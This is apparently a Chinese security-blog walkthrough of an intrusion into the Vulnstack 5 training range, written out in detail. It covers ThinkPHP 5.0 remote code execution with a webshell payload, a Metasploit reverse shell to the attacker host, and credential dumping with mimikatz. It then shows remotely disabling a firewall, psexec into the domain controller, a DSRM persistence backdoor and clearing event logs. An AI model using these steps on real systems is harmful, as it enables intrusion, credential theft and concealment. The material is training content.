![20210218183042.png](https://image.3001.net/images/20210218/1613660031_602e7f7f3241d851d68c8.png!small)

## 前言

在上一节
[《记一次Vulnstack靶场内网渗透（四）》](https://www.freebuf.com/articles/network/263069.html)中，我们玩过了vulnstack
3这个靶场，通过信息收集、Joomla CMS漏洞利用、权限提升、以及域渗透最终拿下了域控并获得域控中的一份重要文件。

在本节中，我测试的靶场是vulnstack
5这个靶场。靶场地址：[http://vulnstack.qiyuanxuetang.net/vuln/detail/7/﻿](http://vulnstack.qiyuanxuetang.net/vuln/detail/7/)

“此次靶场虚拟机共用两个，一个外网一个内网，用来练习红队相关内容和方向，主要包括常规信息收集、Web攻防、代码审计、漏洞利用、内网渗透以及域渗透等相关内容学习，此靶场主要用来学习，请大家遵守网络网络安全法。”

> 文中若有不当之处，还望各位大佬多多点评。
>
> 个人博客：<https://whoamianony.top/>

### 实验环境搭建

VMware新建网卡VMnet14，选择仅主机模式，并将网段IP设置为192.168.138.0：

![image-20210218185303768](https://image.3001.net/images/20210218/1613660033_602e7f81192c409f816d6.png!small)

然后将Windows 7和Windows 2008绑在这个VMnet14上。除此之外，还需要给Windows 7
新增一个网卡，并设置为桥接模式。最终Windows 7具有两个网卡，分别连通内外网，而Windows 2008只有一个网卡连接，处于内网无法与外网通信。

整个靶场环境大致如下：

![20210218200629.png](https://image.3001.net/images/20210218/1613660033_602e7f81f0ca664e400e8.png!small)

Windows 7：

> Web服务器（使用的是PHPStudy，记得自己手动开一下）
>
> 模拟外网IP：192.168.0.101
>
> 内网IP：192.168.138.136

Windows Server 2008：

> 域控制器
>
> 内网IP：192.168.138.138

攻击者VPS：

> OS：Kali Linux
>
> IP：192.168.0.100

## 外网渗透

我们首先对目标机Windows 7（192.168.0.101）进行端口扫：

    
    
    nmap -T4 -sC -sV 192.168.0.101

发现Web服务和Mysql：

![20210218194404.png](https://image.3001.net/images/20210218/1613660036_602e7f84b727e6a4d71ea.png!small)

访问80端口发现是个thinkphp：

![20210218194506.png](https://image.3001.net/images/20210218/1613660038_602e7f86bccc07976dca1.png!small)

版本是ThinkPHP V5.0，既然是V5.0，那么我们就可以尝试一下Thinkphp远程命令执行漏洞。

>
> 漏洞描述：由于thinkphp对框架中的核心Requests类的method方法提供了表单请求伪造，该功能利用`$_POST['_method']`来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置`$_POST['_method']='__construct'`而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。

报错查看详细版本：

![image-20210218195246787](https://image.3001.net/images/20210218/1613660039_602e7f87c7f1178cb69b9.png!small)

使用kali的searchsploit查找一下漏洞利用POC：

    
    
    searchsploit thinkphp

![20210218200703.png](https://image.3001.net/images/20210218/1613660041_602e7f891c044c2dc5be7.png!small)

发现最后一个是thinkphp5.X版本的RCE，我们进入该漏洞的文件46150.txt：

    
    
    cd /usr/share/exploitdb/exploits/php/webapps  
    cat 46150.txt

![20210218195419.png](https://image.3001.net/images/20210218/1613660043_602e7f8bc19af11c385b7.png!small)

payload：

    
    
    http://192.168.0.101/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

命令执行成功：

![20210218195917.png](https://image.3001.net/images/20210218/1613660048_602e7f904d3b3e3b3fb3f.png!small)

写入Webshell：

    
    
    http://192.168.0.101/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php @eval($_POST[whoami]);?>" > shell.php

写入成功：

![20210218200654.png](https://image.3001.net/images/20210218/1613660049_602e7f9166a14c274cf97.png!small)

连接蚁剑：

![20210218200526.png](https://image.3001.net/images/20210218/1613660050_602e7f928da7136023804.png!small)

## 攻入内网

### 内网信息收集

接下来要做的就是信息收集了，详细的内网信息收集请看我的另一篇文章[《内网渗透测试：信息收集与上传下载》](https://www.freebuf.com/articles/network/243640.html)，这里我们只做几个有用的信息收集。

    
    
    ipconfig /all   # 查看本机ip，所在域  
    route print     # 打印路由信息  
    net view        # 查看局域网内其他主机名  
    arp -a          # 查看arp缓存  
    whoami          # 查看当前用户  
    net start       # 查看开启了哪些服务  
    net share       # 查看开启了哪些共享  
      
    net config workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域  
    net user                 # 查看本机用户列表  
    net user /domain         # 查看域用户  
    net localgroup administrators   # 查看本地管理员组（通常会有域用户）  
    net view /domain         # 查看有几个域  
    net user 用户名 /domain   # 获取指定域用户的信息  
    net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）  
    net group 组名 /domain    # 查看域中某工作组  
    net group "domain admins" /domain  # 查看域管理员的名字  
    net group "domain computers" /domain  # 查看域中的其他主机名  
    net group "domain controllers" /domain  # 查看域控制器（可能有多台）

![20210218201141.png](https://image.3001.net/images/20210218/1613660051_602e7f93ce8b5c8b02e1a.png!small)

![20210218201542.png](https://image.3001.net/images/20210218/1613660053_602e7f953da34b66b7685.png!small)

当前用户直接就是administrator管理员账户。目标主机所在的网络环境还存在一个192.168.138.0的网段，并且存在一个名为“sun”的域环境。但是当前我们获得的用户权限却不能收集域信息，所以我们得给这台主机（Windows
7）上一个meterpreter并伪造一个权限较低的用户的令牌然后再来尝试收集域信息。

这里我们使用metasploit的web_delivery模块：

> Metasploit的Web Delivery
> Script是一个多功能模块，可在托管有效负载的攻击机器上创建服务器。当受害者连接到攻击服务器时，负载将在受害者机器上执行。此漏洞需要一种在受害机器上执行命令的方法。特别是你必须能够从受害者到达攻击机器。远程命令执行是使用此模块的攻击向量的一个很好的例子。Web
> Delivery脚本适用于php，python和基于PowerShell的应用程序。详情请看：[《使用Metasploit
> web_delivery反弹shell》](https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247491804&idx=1&sn=38f69b0edca48414ffb6904dd6624894&chksm=)
    
    
    use exploit/multi/script/web_delivery  
    set target 2    # 选择使用powershell类型的payload  
    set payload windows/meterpreter/reverse_tcp  
    set lhost 192.168.0.100  
    exploit

![20210218205737.png](https://image.3001.net/images/20210218/1613660054_602e7f96c0ce94d9401eb.png!small)

将上面生成的payload在目标主机上执行：

![20210218205806.png](https://image.3001.net/images/20210218/1613660058_602e7f9a45c9e46e10b87.png!small)

如上图，目标机Windows 7成功上线。

然后窃取一个低权限域用户“SUN\leo”的令牌：

    
    
    getuid    #查看当前token  
    use incognito #加载incognito  
    list_tokens -u #列出AccessToken  
    impersonate_token "SUN\leo" #模拟DEMO\douser用户  
    rev2self   #返回到之前的AccessToken权限

但即便模拟了SUN\leo用户的令牌也无法执行域内命令。。。后来`getsystem`提升了个权限竟然可以了：

![20210218205815.png](https://image.3001.net/images/20210218/1613660061_602e7f9dd787930eda15b.png!small)

查看域内主机：

![20210218205822.png](https://image.3001.net/images/20210218/1613660063_602e7f9fc4166be889bf7.png!small)

查看域控制器：

![20210218205829.png](https://image.3001.net/images/20210218/1613660065_602e7fa1509a4feb6df36.png!small)

查看域管理员：

![20210218205840.png](https://image.3001.net/images/20210218/1613660066_602e7fa29135ad1745625.png!small)

可知域控制器为DC$，域管理员为Administrator。ping一下DC$得到域控的IP为192.168.138.138：

![20210218205847.png](https://image.3001.net/images/20210218/1613660068_602e7fa40459c7ceef2e0.png!small)

## 横向移动

### 路由转发与代理通道

下面我们来尝试攻击域控。

首先在msfconsole里面添加一个通向192.168.138.0网段的路由：

    
    
    route add 192.168.138.0 255.255.255.0 1  
    route print

![image-20210218210209846](https://image.3001.net/images/20210218/1613660069_602e7fa58f68f0773b4a2.png!small)

然后再Windows 7上传earthworm，搭建socks5反向代理服务。

在攻击机VPS上执行如下命令：

    
    
    ./ew_for_linux64 -s rcsocks -l 1080 -e 1234

在Windows 7上传ew_for_Win.exe并执行如下：

    
    
    ew_for_Win.exe -s rssocks -d 192.168.0.100 -e 1234

![image-20210218214111230](https://image.3001.net/images/20210218/1613660071_602e7fa76b661f0df7ef6.png!small)

然后配置proxychains，将socks5服务器指向127.0.0.1:1080，之后便可以使用proxychains将我们的程序代理进内网了。

### 抓取域用户密码

使用msfconsole中的wiki模块抓取密码：

    
    
    load kiwi  
    kiwi_cmd privilege::debug  
    kiwi_cmd sekurlsa::logonPasswords

报错：

![image-20210218210428570](https://image.3001.net/images/20210218/1613660074_602e7faa6b3880a4cbbd8.png!small)

因为当前是32位的进程无法运行mimikatz，所以我们需要将当前进程迁移到一个64位的进程中。执行ps命令后随便找一个64位的进程迁移进去就行了：

![image-20210218210912530](https://image.3001.net/images/20210218/1613660075_602e7fabc7313d017db02.png!small)

![image-20210218210959563](https://image.3001.net/images/20210218/1613660078_602e7fae6f19edda9781d.png!small)

如上图，成功抓取到了域管理员Administrator和域用户leo的密码：

> SUN\Administrator：dc123.com
>
> SUN\leo：123.com

### Psexec 攻击

既然已经获得了域管理员的用户名密码，那么我们直接尝试使用psexec登录域控（Windows 2008）：

    
    
    use exploit/windows/smb/psexec  
    set rhosts 192.168.138.138  
    set SMBDomain SUN  
    set SMBUser administrator  
    set SMBPass dc123.com  
    # set SMBPass c8c42d085b5e3da2e9260223765451f1:e8bea972b3549868cecd667a64a6ac46  
    set payload windows/meterpreter/bind_tcp  
    set rhost 192.168.138.138  
    run

![image-20210218213517810](https://image.3001.net/images/20210218/1613660081_602e7fb171b2094740acf.png!small)

失败了，应该是Windows 2008开启了防火墙的原因。没关系，既然有了域管理员的密码，我们可以尝试关闭Windows
2008的防火墙。我们用sc通过创建服务来远程执行。

首先在Windows 7上执行如下，让其与Windows 2008建立ipc$连接：

    
    
    net use \\192.168.138.138\ipc$ "dc123.com" /user:"administrator"

![image-20210218215417561](https://image.3001.net/images/20210218/1613660084_602e7fb44e0cfb25c9dd3.png!small)

然后创建服务来远程关闭Windows 2008的防火墙：

    
    
    sc \\192.168.138.138 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"    # 创建服务  
    ​  
    sc \\192.168.138.138 start unablefirewall    # 立即启动服务

![image-20210218215544409](https://image.3001.net/images/20210218/1613660085_602e7fb5f2cf370ee239d.png!small)

此时再次尝试使用psexec登录域控：

![image-20210218215744716](https://image.3001.net/images/20210218/1613660087_602e7fb76fce539af34e2.png!small)

成功上线。

![image-20210218215904419](https://image.3001.net/images/20210218/1613660089_602e7fb94b93cce984e6e.png!small)

开启Windows 2008远程桌面：

    
    
    use post/windows/manage/enable_rdp  
    set session 2  
    run

![image-20210218220208227](https://image.3001.net/images/20210218/1613660090_602e7fbae243728fd696b.png!small)

执行后，使用proxychains设置代理即可连接Windows 2008的远程桌面了：

    
    
    proxychains4 rdesktop 192.168.138.138

![20210218220658.png](https://image.3001.net/images/20210218/1613660092_602e7fbc9fbd5bbe27b5f.png!small)

## 权限维持

### 创建 DSRM 后门

>
> DSRM是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账号(也就是DSRM账号)。DSRM的用途是：允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行
> ntdsutil 命令。
>
>
> 在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。我们知道，每个DC都有本地管理员(administrator)账号和密码（与域管理员账号密码不同）。DSRM账号可以作为每个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。
>
>  
>
>
>  **注意：该类持久化操作适用的服务器版本：Windows Server 2008及以后版本的Windows服务器。**

 **在域控制器上，DSRM账号的表现形式是本地的管理员 Administrator 用户，也就是说本地管理员 Administrator
用户等于DSRM账号。**

首先，我们为 DSRM 账号设置新密码。在域控制器（Windows 2008）的cmd中进入ntdsutil，然后输入下面命令进行修改DSRM账户的密码：

    
    
    ntdsutil    // 进入ntdsutil  
    set dsrm password    // 设置DSRM账户的密码  
    reset password on server null    // 在当前域控制器上恢复DSRM密码  
    <password>    // 输入新密码  
    <password>    // 重新输入新密码  
    q    //退出DSRM密码设置模式  
    q    // 退出ntdsutil

![20210218225211.png](https://image.3001.net/images/20210218/1613660094_602e7fbea88207bc92a35.png!small)

接着，我们使用kiwi模块执行mimikatz命令来读取域控本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功：

    
    
    load kiwi  
    kiwi_cmd privilege::debug  
    kiwi_cmd token::elevate  
    kiwi_cmd lsadump::sam

![image-20210218223211939](https://image.3001.net/images/20210218/1613660095_602e7fbfcf7a54303c7ce.png!small)

如上图所示，本地管理员administrator的NTLM Hash为：e8bea972b3549868cecd667a64a6ac46。

然后，我们修改域控主机的DSRM账户登录方式。在Windows Server
2000以后的版本操作系统中，对DSRM使用控制台登录域控制器进行了限制。我们可以在注册表的HKLM:\System\CurrentControlSet\Control\Lsa\中新建DsrmAdminLogonBehavior项进行设置，将该新建的项中的值设为0、1、2可以分别设置不同的DSRM账户登录方式：

> 0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号
>
> 1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器
>
> 2：在任何情况下，都可以使用DSRM管理员账号登录域控制器

如下所示，我们用powershell命令将DSRM的登录方式设置为“2”，即在任何情况下，都可以使用DSRM管理员账号登录域控制器：

    
    
    New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -name "DsrmAdminLogonBehavior" -value 2 -propertyType DWORD

![image-20210218223826094](https://image.3001.net/images/20210218/1613660097_602e7fc18e05cc36ed252.png!small)

最后，我们即可以在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控了：

    
    
    privilege::debug  
    sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46

 **注意，在这里，/domain 选项不是添域名，而是域控制器的机器名（DC），一定要注意。**

除了向上面那样直接修改DSRM账户的密码外，我们还可以为DSRM同步为一个普通域用户的密码。但是要注意，本次靶场的域控制器的系统版本为Windows
Server 2008，所以需要安装 KB961320 补丁才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server
2008以后版本的系统中不需要安装此补丁。

同步的方式如下：

    
    
    ntdsutil // 进入ntdsutil   
    set dsrm password // 设置DSRM账户的密码  
    sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步  
    q //退出DSRM密码设置模式      
    q // 退出ntdsutil

之后的操作就和上面所演示的一样了，同样还是读取本地SAM文件中的本地管理员的NTLM
Hash，确认域控制器上DSRM账户的密码是否修改成功，然后同样还是修改目标主机DC的DSRM账户登录方式，最后同样还是在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控。

详情请看：<https://www.freebuf.com/articles/web/252963.html>

## 入侵痕迹清理

### Metasploit 痕迹清除

（1）查看事件日志

    
    
    run event_manager -i   

![20210218224857.png](https://image.3001.net/images/20210218/1613660099_602e7fc3400e39078fa5c.png!small)

（2）清除事件日志（包括六种日志类型）

    
    
    run event_manager -c

![20210218224839.png](https://image.3001.net/images/20210218/1613660101_602e7fc5991db2c23e1e2.png!small)

## Ending......

![20210218184436.jpg](https://image.3001.net/images/20210218/1613660104_602e7fc8447ef5e590b7e.jpg!small)

此靶场主要用来学习，请大家遵守网络网络安全法。文中若有不当之处，还望各位大佬多多点评。

个人博客：[https://whoamianony.top/﻿](https://whoamianony.top/)

